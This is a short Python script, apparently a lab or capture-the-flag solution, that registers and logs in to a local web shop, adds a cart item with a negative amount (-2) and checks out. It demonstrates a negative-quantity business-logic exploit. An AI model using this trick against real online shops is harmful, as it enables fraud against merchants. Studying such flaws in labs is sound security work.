import requests
from bs4 import BeautifulSoup

user = "mainuser"
password = "mainpassword"

s = requests.Session()

r = s.post("http://localhost:5103/register", {"username": user, "password": password})
r = s.post("http://localhost:5103/login", {"username": user, "password": password})
r = s.post("http://localhost:5103/cart", {"item": "Cucumber", "amount": -2})
r = s.post("http://localhost:5103/checkout")
print(r.text)